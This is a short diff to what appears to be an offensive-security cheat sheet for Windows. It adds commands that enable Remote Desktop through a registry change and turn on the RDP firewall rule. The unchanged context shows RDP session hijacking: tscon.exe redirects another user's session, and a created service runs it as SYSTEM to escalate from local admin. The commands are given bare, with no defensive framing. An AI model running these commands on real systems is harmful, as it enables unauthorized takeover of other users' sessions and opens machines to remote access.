@@ -31,4 +31,8 @@ tscon.exe <SESSION_ID> /dest:<SESSION_NAME>
 # Local Admin => SYSTEM
 sc.exe create sessionhijack binpath= "cmd.exe /k tscon.exe <SESSION_ID> /dest:<SESSION_NAME>"
 net.exe start sessionhijack
+
+# Enable RDP
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 ```
